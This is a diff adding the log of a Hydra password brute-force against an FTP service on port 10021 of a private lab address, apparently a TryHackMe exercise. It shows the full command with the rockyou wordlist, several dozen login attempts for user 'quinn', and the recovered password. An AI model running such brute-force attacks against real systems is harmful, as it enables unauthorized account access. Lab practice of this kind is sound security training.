@@ -1,0 +1,63 @@
+ hydra -l quinn -P ~/Tryhackme/List_For_Enumeration/wordlists/rockyou.txt 10.10.37.230 ftp -s 10021 -f -V 
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-17 10:55:21
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ftp://10.10.37.230:10021/
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "123456" - 1 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "12345" - 2 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "password" - 4 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "princess" - 6 of 14344399 [child 5] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "12345678" - 9 of 14344399 [child 8] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "abc123" - 10 of 14344399 [child 9] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "nicole" - 11 of 14344399 [child 10] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "daniel" - 12 of 14344399 [child 11] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "babygirl" - 13 of 14344399 [child 12] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "monkey" - 14 of 14344399 [child 13] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "lovely" - 15 of 14344399 [child 14] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "jessica" - 16 of 14344399 [child 15] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "654321" - 17 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "michael" - 18 of 14344399 [child 6] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "ashley" - 19 of 14344399 [child 7] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "qwerty" - 20 of 14344399 [child 10] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "111111" - 21 of 14344399 [child 13] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "iloveu" - 22 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "000000" - 23 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "michelle" - 24 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "tigger" - 25 of 14344399 [child 4] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "sunshine" - 26 of 14344399 [child 8] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "chocolate" - 27 of 14344399 [child 9] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "password1" - 28 of 14344399 [child 11] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "soccer" - 29 of 14344399 [child 12] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "anthony" - 30 of 14344399 [child 14] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "friends" - 31 of 14344399 [child 15] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "butterfly" - 32 of 14344399 [child 5] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "purple" - 33 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "angel" - 34 of 14344399 [child 4] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "jordan" - 35 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "liverpool" - 36 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "justin" - 37 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "loveme" - 38 of 14344399 [child 5] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "fuckyou" - 39 of 14344399 [child 6] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "123123" - 40 of 14344399 [child 7] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "football" - 41 of 14344399 [child 8] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "secret" - 42 of 14344399 [child 9] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "andrea" - 43 of 14344399 [child 10] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "carlos" - 44 of 14344399 [child 11] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "jennifer" - 45 of 14344399 [child 12] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "joshua" - 46 of 14344399 [child 13] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "bubbles" - 47 of 14344399 [child 14] (0/0)
+[ATTEMPT] target 10.10.37.230 - login "quinn" - pass "1234567890" - 48 of 14344399 [child 15] (0/0)
+
+
+[10021][ftp] host: 10.10.37.230   login: quinn   password: andrea
+
+
+
+[STATUS] attack finished for 10.10.37.230 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-17 10:55:31
